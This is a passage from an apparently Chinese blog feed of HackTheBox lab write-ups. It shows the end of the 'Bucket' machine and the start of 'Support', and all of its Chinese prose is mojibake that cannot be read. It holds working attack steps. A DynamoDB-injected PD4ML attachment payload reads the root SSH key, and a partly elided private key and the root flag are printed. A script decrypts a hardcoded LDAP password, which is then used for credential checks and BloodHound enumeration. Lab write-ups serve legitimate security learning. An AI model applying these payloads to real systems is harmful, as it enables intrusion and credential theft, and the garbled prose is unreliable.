list-tables --endpoint-url http://bucket.htb:4567\n{\n    \"TableNames\": [\n        \"Music\",\n        \"users\"\n    ]\n}\n```\n\n`users`å’Œæˆ‘ä»¬åœ¨å¤–éƒ¨ç«¯ç‚¹è®¿é—®çš„ä¸€æ ·ï¼Œ`Music`æ˜¯ç©ºçš„ï¼ˆå¯èƒ½å…¶ä»–äººä½¿ç”¨å®˜æ–¹æ–‡æ¡£ä¸­çš„è¯­å¥åˆ›å»ºçš„ï¼‰ï¼Œæ„Ÿè§‰å°±æ˜¯ä¹‹å‰çš„å¤–éƒ¨ç«¯ç‚¹\n\n### To root\n\nå›åˆ°`8000`ç«¯å£ï¼Œæˆ‘ä»¬å‘ç°è¿™æ˜¯ä¸€ä¸ªä¸å°çš„é¡¹ç›®ï¼Œçº¿è·¯ä¹Ÿå¯èƒ½åœ¨è¿™é‡Œ\n\n```bash\nroy@bucket:/var/www/bucket-app$ ls\ncomposer.json  composer.lock  files  index.php  pd4ml_demo.jar  vendor\n```\n\n```bash\nroy@bucket:/var/www$ getfacl bucket-app/\n# file: bucket-app/\n# owner: root\n# group: root\nuser::rwx\nuser:roy:r-x\ngroup::r-x\nmask::r-x\nother::---\n```\n\n`index.php`\n\n```bash\nroy@bucket:/var/www/bucket-app$ cat index.php\n<?php\nrequire 'vendor/autoload.php';\nuse Aws\\DynamoDb\\DynamoDbClient;\nif($_SERVER[\"REQUEST_METHOD\"]===\"POST\") {\n        if($_POST[\"action\"]===\"get_alerts\") {\n                date_default_timezone_set('America/New_York');\n                $client = new DynamoDbClient([\n                        'profile' => 'default',\n                        'region'  => 'us-east-1',\n                        'version' => 'latest',\n                        'endpoint' => 'http://localhost:4566'\n                ]);\n\n                $iterator = $client->getIterator('Scan', array(\n                        'TableName' => 'alerts',\n                        'FilterExpression' => \"title = :title\",\n                        'ExpressionAttributeValues' => array(\":title\"=>array(\"S\"=>\"Ransomware\")),\n                ));\n\n                foreach ($iterator as $item) {\n                        $name=rand(1,10000).'.html';\n                        file_put_contents('files/'.$name,$item[\"data\"]);\n                }\n                passthru(\"java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf\");\n        }\n}\nelse\n{\n?>\n```\n\né€»è¾‘å¤§æ¦‚æ˜¯é€šè¿‡`POST`æ–¹æ³•è®¿é—®ï¼Œå¹¶ä¸”å‚æ•°`action`ç­‰äº`get_alerts` æ—¶ï¼Œå¯¹æ•°æ®è¿›è¡Œè¿æ¥ï¼Œç„¶åå¾ªç¯`alerts`è¡¨å¹¶ç­›é€‰è¡¨è¾¾å¼ä¸­Â `:title`Â å ä½ç¬¦çš„å€¼ï¼Œè¿™é‡Œä¸º \"`Ransomware`\"ã€‚å†ä¸‹é¢çš„å¾ªç¯ä¸Šè¾¹ç­›é€‰åçš„å€¼ï¼Œç”Ÿæˆä¸€ä¸ª1åˆ°10000ä¹‹é—´çš„éšæœºæ•°ï¼Œå¹¶é™„åŠ Â `.html`Â åç¼€ï¼Œä½œä¸º HTML æ–‡ä»¶åï¼Œå¹¶å°†ç­›é€‰åçš„å€¼çš„`data`å†™å…¥`HTML` æ–‡ä»¶ã€‚æš—ç¤ºäº†ä½ çš„ DynamoDBÂ `alerts`Â è¡¨ä¸­çš„é¡¹ç›®çš„Â `data`Â å±æ€§å­˜å‚¨çš„æ˜¯ HTML å†…å®¹ã€‚\n\næœ€åä¸€è¡Œï¼Œè°ƒç”¨äº†`pd4ml_demo.jar` ï¼Œæä¾›ç”¨äº HTML åˆ° PDF è½¬æ¢çš„åŸºæœ¬ Java APIï¼ŒåŒ…æ‹¬ PD4ML JSP æ ‡ç­¾åº“ã€‚\n\né‚£ä¹ˆæœ€åä¸€å¥å°±æ˜¯å°†ç”Ÿæˆ`HTML`æ–‡ä»¶é’»æ¢æˆ`PDF`æ–‡ä»¶ï¼Œå¹¶å­˜æ”¾åœ¨`files/result.pdf`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image14.png)\n\næˆ‘ä»¬è§‚å¯Ÿ`files`æ–‡ä»¶å¤¹æ²¡æœ‰ä»»ä½•æ–‡ä»¶äº§ç”Ÿï¼Œåº”è¯¥æ˜¯è¡¨`alerts`ä¸å­˜åœ¨ï¼Œæˆ‘ä»¬é¦–å…ˆåˆ›å»º`alerts`è¡¨\n\n```bash\naws dynamodb create-table \\\n    --table-name alerts \\\n    --attribute-definitions \\\n        AttributeName=title,AttributeType=S \\\n        AttributeName=data,AttributeType=S \\\n    --key-schema \\\n        AttributeName=title,KeyType=HASH \\\n        AttributeName=data,KeyType=RANGE \\\n    --provisioned-throughput \\\n        ReadCapacityUnits=5,WriteCapacityUnits=5 \\\n    --endpoint-url http://bucket.htb:4567\n```\n\n```bash\naws dynamodb tables-list --endpoint-url http://bucket.htb:4567\n{\n    \"TableNames\": [\n        \"Music\",\n        \"alerts\",\n        \"users\"\n    ]\n}\n```\n\nä½†æ˜¯æˆ‘ä»¬èƒ½å‘ç°ä¸€ä¼šåï¼Œ`alerts`è¡¨å°±ä¼šè¢«åˆ é™¤ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦é€šè¿‡è„šæœ¬æ¥æ‰§è¡Œæ“ä½œ\n\nå°è¯•åŒ…å«æ–‡ä»¶ï¼Œè¿™é‡Œæˆ‘ä»¬æŸ¥çœ‹`pd4ml`çš„æ–‡æ¡£ï¼Œå…¶ä¸­æœ‰ä¸€é¡¹æ˜¯æ·»åŠ é™„ä»¶ï¼šhttps://pd4ml.com/support-topics/usage-examples/#add-attachment\n\n```bash\n<html><pd4ml:attachment style=\\\"align: right\\\" type=\\\"paperclip\\\" src=\\\"/root/root.txt\\\"/></html>\n```\n\nç¼–å†™è„šæœ¬\n\n```bash\necho 'create table alerts\\n'\naws dynamodb create-table \\\n    --table-name alerts \\\n    --attribute-definitions \\\n        AttributeName=title,AttributeType=S \\\n        AttributeName=data,AttributeType=S \\\n    --key-schema \\\n        AttributeName=title,KeyType=HASH \\\n        AttributeName=data,KeyType=RANGE \\\n    --provisioned-throughput \\\n        ReadCapacityUnits=5,WriteCapacityUnits=5 \\\n    --endpoint-url http://bucket.htb:4567\n\nsleep 2;\necho 'create talbe success?\\n'\naws dynamodb list-tables --endpoint-url http://bucket.htb:4567\nsleep 2;\necho 'Insert data:\\n'\naws dynamodb put-item \\\n    --table-name alerts  \\\n    --item \\\n        '{\"title\": {\"S\": \"Ransomware\"}, \"data\": {\"S\": \"<pd4ml:attachment description=\\\"attached.txt\\\" icon=\\\"PushPin\\\">file:///root/.ssh/id_rsa</pd4ml:attachment>\"}}' \\\n    --endpoint-url http://bucket.htb:4567\necho 'POST endpoint && copy the file'\ncurl http://bucket.htb:8001 -X POST -d 'action=get_alerts'\n```\n\næŸ¥çœ‹ `result.pdf` ï¼Œèƒ½æ‹¿åˆ°ç§é’¥\n\n```bash\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAYEAx6VphKMyxurjldmb6dy1OSn0D9dumFAUCeSoICwhhsq+fadx21SU\n......\npHoTvd81++IRB1+g6GGy0gq/j0Tp+g3e0KLtvr7ZfAtutO8bcDrLjHu6Wqyl1KoleFsv6/\nlt0oT70NTv2gFGWAb6WHLEByEsnYQwk5ynbIblaApQSZEyVEPkf9LmO7AEb08lvAOS0dQ1\nxMyLerif0cNjmemwAAAAtyb290QHVidW50dQECAwQFBg==\n-----END OPENSSH PRIVATE KEY-----\n```\n\né€šè¿‡ç§é’¥ç™»å½•åï¼Œè¯»å– `root.txt`\n\n```bash\nroot@bucket:~# cat root.txt \n880bb2407bd062f1f9896875e8d049bf\n```\n\n## æ€»ç»“\n\nåˆä¸€æ¬¡æ„Ÿåˆ°è‡ªå·±æ˜¯çœŸçš„æ— è€å¿ƒâ€¦ä¸€çƒ¦èºèµ·æ¥å°±æ— æ³•æ€è€ƒã€‚ã€‚è¿™æ¬¡ç¢°åˆ°æ–°ä¸œè¥¿ï¼Œå¡äº†è¿˜æ˜¯è›®ä¹…çš„ï¼Œä¸è¿‡åˆ©ç”¨éƒ½æ²¡ä»€ä¹ˆæŒ¡ä½çš„åœ°æ–¹ï¼Œé™¤äº†æœ€åçš„è¯»å–æ–‡ä»¶ã€‚\n\nå­¦ä¹ åˆ°äº† `AWS S3`ï¼Œä»¥åŠä¸€äº›`Dynamodb` çš„çŸ¥è¯†",
            "url": "https://www.sunsetaction.top/2025/06/06/HackTheBoxMachine - Bucket",
            "title": "HackTheBox - Machine - Bucket",
            "summary": "Machine Bucket https://app.hackthebox.com/machines/Bucket | Linux | Medium Recon ç«¯å£æ‰«æ è®¿é—® HTTP ä¸»é¡µä¸Šæ²¡æœ‰ä¸€ç‚¹ä¿¡æ¯ï¼Œå¯¹ç›®å½•è¿›è¡Œçˆ†ç ´ ä½†æ˜¯æˆ‘æ³¨æ„åˆ°æºä»£ç ä¸­çš„å›¾ç‰‡æ˜¯é€šè¿‡å­åŸŸåhttp://s3.bucket.ht...",
            "date_modified": "2025-06-06T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "HackTheBox",
                "Linux",
                "AWS_S3",
                "Dynamodb",
                "PD4ML"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/06/05/HackTheBoxMachine -Support",
            "content_html": "\n# Machine -Support\n\n> https://app.hackthebox.com/machines/Support | `Windows`Â |Â `~~Easy~~` `Medium`\n> \n\n![image.png](/post-images/HackTheBoxMachine%20-Support/image.png)\n\n## Recon\n\n### ç«¯å£ä¿¡æ¯\n\nä½¿ç”¨ `nmap` è¿›è¡Œæ‰«æ\n\n```bash\nâœ  Support nmap -sT -min-rate 5000 10.10.11.174\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-04 21:06 CST\nNmap scan report for support.htb (10.10.11.174)\nHost is up (0.13s latency).\nNot shown: 988 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n53/tcp   open  domain\n88/tcp   open  kerberos-sec\n135/tcp  open  msrpc\n139/tcp  open  netbios-ssn\n389/tcp  open  ldap\n445/tcp  open  microsoft-ds\n464/tcp  open  kpasswd5\n593/tcp  open  http-rpc-epmap\n636/tcp  open  ldapssl\n3268/tcp open  globalcatLDAP\n3269/tcp open  globalcatLDAPssl\n5985/tcp open  wsman\n\nNmap done: 1 IP address (1 host up) scanned in 1.00 seconds\n```\n\n```bash\nâœ  Support nmap -sT -A -p 53,88,135,138,389,445,636,593,3268,3269 10.10.11.174\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-04 21:07 CST\nNmap scan report for support.htb (10.10.11.174)\nHost is up (0.20s latency).\n\nPORT    STATE    SERVICE       VERSION\n53/tcp  open     domain        Simple DNS Plus\n88/tcp  open     kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-04 12:45:55Z)\n135/tcp open     msrpc         Microsoft Windows RPC\n138/tcp filtered netbios-dgm\n389/tcp open     ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)\n445/tcp open     microsoft-ds?\n636/tcp open     tcpwrapped\n593/tcp  open  ncacn_http Microsoft Windows RPC over HTTP 1.0\n3268/tcp open  ldap       Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2022 (88%)\nOS CPE: cpe:/o:microsoft:windows_server_2022\nAggressive OS guesses: Microsoft Windows Server 2022 (88%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2025-06-04T12:46:16\n|_  start_date: N/A\n|_clock-skew: -21m30s\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   122.30 ms 10.10.16.1\n2   237.33 ms support.htb (10.10.11.174)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 68.41 seconds\n```\n\n### SMB æšä¸¾\n\næµ‹è¯•`SMB`æ˜¯å¦å…è®¸åŒ¿åç™»å½•\n\n```bash\nâœ  Support smbclient -L 10.10.11.174 -U anonymous                                      \nPassword for [WORKGROUP\\anonymous]:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share \n        support-tools   Disk      support staff tools\n        SYSVOL          Disk      Logon server share \nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 10.10.11.174 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n```\n\nå…è®¸åŒ¿åç™»å½•ï¼Œå¹¶ä¸”åœ¨`support-tools`ä¸­æœ‰ä¸€äº›å·¥å…·ï¼Œå…¨éƒ¨ `get` ä¸‹æ¥\n\n```bash\nâœ  Support smbclient //10.10.11.174/support-tools -U anonymous -N\nTry \"help\" to get a list of possible commands.\nsmb: \\> dir\n  .                                   D        0  Thu Jul 21 01:01:06 2022\n  ..                                  D        0  Sat May 28 19:18:25 2022\n  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 19:19:19 2022\n  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 19:19:55 2022\n  putty.exe                           A  1273576  Sat May 28 19:20:06 2022\n  SysinternalsSuite.zip               A 48102161  Sat May 28 19:19:31 2022\n  UserInfo.exe.zip                    A   277499  Thu Jul 21 01:01:07 2022\n  windirstat1_1_2_setup.exe           A    79171  Sat May 28 19:20:17 2022\n  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 19:19:43 2022\n\n                4026367 blocks of size 4096. 955928 blocks available\nsmb: \\> \n```\n\n1. `7-ZipPortable_21.07.paf.exe`:\n    - **å·¥å…·:**Â 7-Zip Portable\n    - **ç”¨é€”:**Â è¿™æ˜¯ä¸€ä¸ªä¾¿æºç‰ˆæœ¬çš„ 7-Zip æ–‡ä»¶å½’æ¡£å™¨ã€‚7-Zip æ˜¯ä¸€æ¬¾å…è´¹å¼€æºçš„å‹ç¼©/è§£å‹ç¼©è½¯ä»¶ï¼Œæ”¯æŒå¤šç§æ ¼å¼ï¼Œå¦‚ 7z, ZIP, GZIP, TAR, RAR ç­‰ã€‚`.paf.exe`Â é€šå¸¸æ˜¯ PortableApps.com æ ¼å¼çš„ä¾¿æºåº”ç”¨ã€‚\n2. `npp.8.4.1.portable.x64.zip`:\n    - **å·¥å…·:**Â Notepad++ Portable (64ä½)\n    - **ç”¨é€”:**Â è¿™æ˜¯ä¸€ä¸ªåŒ…å« Notepad++ ä¾¿æºç‰ˆçš„ ZIP å‹ç¼©æ–‡ä»¶ã€‚Notepad++ æ˜¯ä¸€æ¬¾éå¸¸æµè¡Œçš„å…è´¹æºä»£ç ç¼–è¾‘å™¨å’Œ Windows è®°äº‹æœ¬æ›¿ä»£å“ï¼Œæ”¯æŒå¤šç§ç¼–ç¨‹è¯­è¨€ï¼ŒåŠŸèƒ½å¼ºå¤§ã€‚\n3. `putty.exe`:\n    - **å·¥å…·:**Â PuTTY\n    - **ç”¨é€”:**Â è¿™æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ PuTTY å¯æ‰§è¡Œæ–‡ä»¶ã€‚PuTTY æ˜¯ä¸€æ¬¾å¹¿å—æ¬¢è¿çš„å…è´¹å¼€æºç»ˆç«¯æ¨¡æ‹Ÿå™¨ã€ä¸²è¡Œæ§åˆ¶å°å’Œç½‘ç»œæ–‡ä»¶ä¼ è¾“åº”ç”¨ç¨‹åºã€‚å®ƒæœ€å¸¸ç”¨äºé€šè¿‡ SSHã€Telnet æˆ– rlogin åè®®è¿æ¥åˆ°è¿œç¨‹æœåŠ¡å™¨ã€‚\n4. `SysinternalsSuite.zip`:\n    - **å·¥å…·:**Â Sysinternals Suite\n    - **ç”¨é€”:**Â è¿™æ˜¯ä¸€ä¸ªåŒ…å«å¾®è½¯ Sysinternals Suite çš„ ZIP å‹ç¼©æ–‡ä»¶ã€‚Sysinternals Suite æ˜¯ä¸€å¥—ç”± Mark Russinovich å¼€å‘çš„å¼ºå¤§çš„ Windows ç³»ç»Ÿç®¡ç†ã€æ•…éšœæ’é™¤å’Œè¯Šæ–­å·¥å…·é›†åˆï¼ˆç°åœ¨å±äºå¾®è½¯ï¼‰ã€‚è‘—åçš„å·¥å…·åŒ…æ‹¬ Process Explorer, Process Monitor, Autoruns, PsExec ç­‰ã€‚\n5. `UserInfo.exe.zip`:\n    - **å·¥å…·:**Â æœªçŸ¥ (å¯èƒ½ä¸ºè‡ªå®šä¹‰æˆ–ç‰¹å®šç”¨é€”å·¥å…·)\n    - **ç”¨é€”:**Â è¿™æ˜¯ä¸€ä¸ªåä¸ºÂ `UserInfo.exe`Â çš„å¯æ‰§è¡Œæ–‡ä»¶çš„ ZIP å‹ç¼©åŒ…ã€‚ä»åç§°ä¸Šçœ‹ï¼Œå®ƒå¯èƒ½æ˜¯ä¸€ä¸ªç”¨äºæ”¶é›†æˆ–æ˜¾ç¤ºç”¨æˆ·ä¿¡æ¯çš„å·¥å…·ã€‚è¿™å¯èƒ½æ˜¯ç³»ç»Ÿç®¡ç†å‘˜å¸¸ç”¨çš„è‡ªå®šä¹‰è„šæœ¬æˆ–å°ç¨‹åºï¼Œæˆ–è€…æ˜¯ç‰¹å®šåœºæ™¯ä¸‹éœ€è¦çš„å·¥å…·ã€‚åœ¨æ¸—é€æµ‹è¯•ä¸­ï¼Œè¿™ç±»è‡ªå®šä¹‰å·¥å…·å¾€å¾€å€¼å¾—è¿›ä¸€æ­¥åˆ†æã€‚\n6. `windirstat1_1_2_setup.exe`:\n    - **å·¥å…·:**Â WinDirStat å®‰è£…ç¨‹åº\n    - **ç”¨é€”:**Â è¿™æ˜¯ WinDirStat ç‰ˆæœ¬ 1.1.2 çš„å®‰è£…ç¨‹åºã€‚WinDirStat æ˜¯ä¸€æ¬¾ç£ç›˜ä½¿ç”¨æƒ…å†µç»Ÿè®¡æŸ¥çœ‹å™¨å’Œæ¸…ç†å·¥å…·ï¼Œå®ƒå¯ä»¥å›¾å½¢åŒ–åœ°æ˜¾ç¤ºç£ç›˜ç©ºé—´å ç”¨æƒ…å†µï¼Œå¸®åŠ©ç”¨æˆ·æ‰¾åˆ°å ç”¨ç©ºé—´å¤§çš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ã€‚\n7. `WiresharkPortable64_3.6.5.paf.exe`:\n    - **å·¥å…·:**Â Wireshark Portable (64ä½)\n    - **ç”¨é€”:**Â è¿™æ˜¯ä¸€ä¸ªä¾¿æºç‰ˆæœ¬çš„ Wiresharkã€‚Wireshark æ˜¯ä¸–ç•Œä¸Šåº”ç”¨æœ€å¹¿æ³›çš„ç½‘ç»œåè®®åˆ†æå™¨ï¼Œç”¨äºæ•è·å’Œäº¤äº’å¼æµè§ˆè®¡ç®—æœºç½‘ç»œä¸Šè¿è¡Œçš„æµé‡ã€‚`.paf.exe`Â æ ¼å¼è¡¨æ˜å®ƒä¹Ÿæ˜¯ PortableApps.com çš„ä¾¿æºåº”ç”¨ã€‚\n\nä¸Šé¢çš„æ‰€æœ‰åº”ç”¨ä¸­åªæœ‰`UserInfo.exe` ä¸æ˜¯å…¬å¼€çš„è½¯ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ç€é‡å¯¹è¯¥è½¯ä»¶è¿›è¡Œåˆ†æ\n\n## åˆ†æ UserInfo.exe\n\nä½¿ç”¨ `dnSpy` æ¥åˆ†æï¼Œè¯¥ç¨‹åºè²Œä¼¼æ˜¯é€šè¿‡ `LDAP` æ¥æ£€ç´¢ç”¨æˆ·ä¿¡æ¯ï¼Œå¹¶ä¸”å†…ç½®äº†ç”¨æˆ·ï¼ˆå¤§è‡´çœ‹æ‡‚ï¼‰\n\nä¸‹é¢çš„ç±» `Protected` æ˜¯åŠ å¯†å¯†ç çš„ï¼ˆè¿™é‡Œå¼€å§‹ä½¿ç”¨`AI`æ¥åˆ†æï¼‰\n\nè¿™ä¸€æ®µä»£ç å…¶å®æ˜¯ä½¿ç”¨å¼‚æˆ–åŠ å¯†å¯†ç ï¼Œå¹¶ä¸”ç§˜é’¥æ˜¯`armando` ï¼Œå› æ­¤æˆ‘ä»¬èƒ½å¤Ÿç›´æ¥å¾—åˆ°å¯†ç \n\n```bash\nusing System;\nusing System.Text;\n\nnamespace UserInfo.Services\n{\n\t// Token: 0x02000006 RID: 6\n\tinternal class Protected\n\t{\n\t\t// Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318\n\t\tpublic static string getPassword()\n\t\t{\n\t\t\tbyte[] array = Convert.FromBase64String(Protected.enc_password);\n\t\t\tbyte[] array2 = array;\n\t\t\tfor (int i = 0; i < array.Length; i++)\n\t\t\t{\n\t\t\t\tarray2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);\n\t\t\t}\n\t\t\treturn Encoding.Default.GetString(array2);\n\t\t}\n\n\t\t// Token: 0x04000005 RID: 5\n\t\tprivate static string enc_password = \"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E\";\n\n\t\t// Token: 0x04000006 RID: 6\n\t\tprivate static byte[] key = Encoding.ASCII.GetBytes(\"armando\");\n\t}\n}\n```\n\né€šè¿‡ `AI` ç”Ÿæˆè§£å¯†è„šæœ¬\n\n```bash\nimport base64\n\n# ä» C# ä»£ç ä¸­è·å–çš„å€¼\nenc_password_b64 = \"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E\"\nkey_string = \"armando\"\nxor_constant = 223\n\n# 1. Base64 è§£ç \ntry:\n    encrypted_bytes = base64.b64decode(enc_password_b64)\nexcept base64.binascii.Error as e:\n    print(f\"Base64 è§£ç é”™è¯¯: {e}\")\n    exit()\n\n# 2. è·å–å¯†é’¥çš„å­—èŠ‚å½¢å¼ (ASCII)\nkey_bytes = key_string.encode('ascii')\n\n# å‡†å¤‡ä¸€ä¸ªå¯å˜çš„å­—èŠ‚æ•°ç»„æ¥å­˜æ”¾è§£å¯†åçš„å­—èŠ‚\ndecrypted_bytes = bytearray()\n\n# 3. æ‰§è¡Œ XOR è§£å¯†\nfor i in range(len(encrypted_bytes)):\n    # C# ä¸­çš„é€»è¾‘æ˜¯: (byte ^ key_byte ^ 223)\n    dec_byte = encrypted_bytes[i] ^ key_bytes[i % len(key_bytes)] ^ xor_constant\n    decrypted_bytes.append(dec_byte)\n\n# 4. å°†è§£å¯†åçš„å­—èŠ‚æ•°ç»„è½¬æ¢ä¸ºå­—ç¬¦ä¸²\n# C# ä¸­çš„ Encoding.Default è¡Œä¸ºå¯èƒ½ä¾èµ–äºç³»ç»ŸåŒºåŸŸè®¾ç½®ã€‚\n# æˆ‘ä»¬é¦–å…ˆå°è¯• 'utf-8'ï¼Œå¦‚æœå¯†ç åŒ…å«é ASCII å­—ç¬¦ä¸”ç¼–ç ä¸åŒï¼Œå¯èƒ½éœ€è¦è°ƒæ•´ã€‚\n# å¯¹äºè¿™ä¸ªç‰¹å®šçš„å¯†ç  \"Cisco.12345\"ï¼Œ'utf-8' æˆ– 'ascii' éƒ½å¯ä»¥ã€‚\ntry:\n    final_password = decrypted_bytes.decode('utf-8')\nexcept UnicodeDecodeError:\n    # å¦‚æœ utf-8 å¤±è´¥ï¼Œå¯ä»¥å°è¯•å…¶ä»–ç¼–ç ï¼Œå¦‚ latin-1 (å¸¸ç”¨äºæ¨¡æ‹ŸæŸäº› Windows é»˜è®¤ç¼–ç )\n    try:\n        final_password = decrypted_bytes.decode('latin-1')\n    except UnicodeDecodeError as e:\n        print(f\"å­—ç¬¦ä¸²è§£ç é”™è¯¯: {e}\")\n        print(f\"è§£å¯†åçš„å­—èŠ‚ï¼ˆåŸå§‹ï¼‰: {decrypted_bytes}\")\n        final_password = \"è§£ç å¤±è´¥ï¼Œè¯·æ£€æŸ¥ç¼–ç \"\n\n# æ‰“å°ç»“æœ\nprint(f\"Base64 ç¼–ç çš„å¯†æ–‡: {enc_password_b64}\")\nprint(f\"å¯†é’¥å­—ç¬¦ä¸²: {key_string}\")\nprint(f\"å›ºå®šçš„ XOR å€¼: {xor_constant}\")\nprint(f\"è§£å¯†åçš„å­—èŠ‚ (åå…­è¿›åˆ¶): {decrypted_bytes.hex()}\")\nprint(f\"è§£å¯†åçš„å¯†ç : {final_password}\")\n```\n\n```bash\nâœ  Support python getpass.py       \nBase64 ç¼–ç çš„å¯†æ–‡: 0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E\nå¯†é’¥å­—ç¬¦ä¸²: armando\nå›ºå®šçš„ XOR å€¼: 223\nè§£å¯†åçš„å­—èŠ‚ (åå…­è¿›åˆ¶): 6e764566454b31365e31614d3424653741636c55663878247452577850574f31256c6d7a\nè§£å¯†åçš„å¯†ç : nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz\n```\n\nè€Œ `LdapQuery` ç±»çš„æ„é€ å‡½æ•°ä¸­èƒ½çœ‹åˆ°\n\n```bash\npublic LdapQuery()\n\t\t{\n\t\t\tstring password = Protected.getPassword();\n\t\t\tthis.entry = new DirectoryEntry(\"LDAP://support.htb\", \"support\\\\ldap\", password);\n\t\t\tthis.entry.AuthenticationType = AuthenticationTypes.Secure;\n\t\t\tthis.ds = new DirectorySearcher(this.entry);\n\t\t}\n```\n\nåˆ›å»º `DirectoryEntry` å¯¹è±¡æ—¶ï¼Œç¬¬äºŒä¸ªå‚æ•°é€šå¸¸ç”¨äºæŒ‡å®šç”¨æˆ·åã€‚å› æ­¤ï¼Œè¿™é‡Œçš„ç”¨æˆ·åæ˜¯ï¼š`support\\ldap`\n\nè¿™ä¸ªæ ¼å¼ `DOMAIN\\username` è¡¨æ˜ `support` å¯èƒ½æ˜¯åŸŸåæˆ–è€…å·¥ä½œç»„åï¼Œè€Œ `ldap` æ˜¯å…·ä½“çš„ç”¨æˆ·åã€‚\n\næˆ‘ä»¬ç›´æ¥æµ‹è¯•å‡­æ®æ˜¯å¦æ˜¯æ­£ç¡®çš„\n\n```bash\nâœ  Support nxc ldap 10.10.11.174 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb\nLDAP        10.10.11.174    389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)\nLDAP        10.10.11.174    389    DC               [+] support.htb\\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz \n```\n\nå‡­æ®æ˜¯æ­£ç¡®çš„\n\n## åŸŸåˆ†æ\n\n### åŸŸåˆæ¬¡åˆ†æ\n\n`BloodHound` åˆ†æåŸŸ\n\n```bash\nâœ  Support bloodhound-python -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d 'support.htb' -ns 10.10.11.174 --zip -c All -dc 'support.htb'\nINFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: support.htb\nINFO: Getting TGT for user\nINFO: Connecting to LDAP server: support.htb\nWARNING: Kerberos auth to LDAP failed, trying NTLM\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 3 computers\nINFO: Connecting to LDAP server: support.htb\nWARNING: Kerberos auth to LDAP failed, trying NTLM\nINFO: Found 21 users\nINFO: Found 53 groups\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: SummerMachine.support.htb\nINFO: Querying computer: Management.support.htb\nINFO: Querying computer: dc.support.htb\nWARNING: Could not resolve: SummerMachine.support.htb: The resolution lifetime expired after 3.104 seconds: Server Do53:10.10.11.174@53 answered The DNS operation timed out.\nINFO: Done in 00M 23S\nINFO: Compressing output into 20250605003230_bloodhound.zip\n```\n\næˆ‘ä»¬å½“å‰è·å¾—çš„ç”¨æˆ· `Ldap` çš„ä¿¡æ¯ï¼Œä»…ä»…åªæ˜¯åŸŸæˆå‘˜\n\n![image.png](/post-images/HackTheBoxMachine%20-Support/image1.png)\n\næ‰€æœ‰çš„ç”¨æˆ·\n\n![image.png](/post-images/HackTheBoxMachine%20-Support/image2.png)\n\næˆ‘ä»¬æŸ¥çœ‹è¿œç¨‹ç»„æœ‰å“ªäº›æˆå‘˜\n\n![image.png](/post-images/HackTheBoxMachine%20-Support/image3.png)\n\n`SUPPORT`ç”¨æˆ·ä¿¡æ¯\n\n![image.png](/post-images/HackTheBoxMachine%20-Support/image4.png)\n\né‚£æˆ‘ä»¬å¤§æ¦‚æ˜¯è¦å…ˆè·å–åˆ°`SUPPORT` ç”¨æˆ·ï¼Ÿä½†æ˜¯ç°åœ¨æ²¡æœ‰åˆ«çš„ä¿¡æ¯äº†\n\n### LDAP ä¿¡æ¯æ”¶é›†\n\næ‰€ä»¥æˆ‘ä»¬å…ˆä½¿ç”¨ `LADP` 